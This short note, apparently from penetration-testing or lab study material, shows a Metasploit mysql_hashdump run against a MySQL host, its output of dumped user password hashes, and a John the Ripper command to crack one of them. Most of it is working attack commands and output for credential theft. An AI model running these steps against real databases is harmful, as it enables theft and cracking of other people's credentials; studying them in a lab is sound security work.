Example:

Exploit MySQL with [MetaSploit](metasploit)

```
use auxiliary/scanner/mysql/mysql_hashdump 
options
set RHOSTS 10.10.60.123
set USERNAME root
set PASSWORD password
exploit
```

Output:

```
[+] 10.10.60.123:3306     - Saving HashString as Loot: root:
[+] 10.10.60.123:3306     - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.60.123:3306     - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.60.123:3306     - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.60.123:3306     - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.60.123:3306     - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.60.123:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

And Bruteforce:

```
echo carl:*EA031893AA21444B170FC2162A56978B8CEECE18 > hash.txt
john hash.txt
```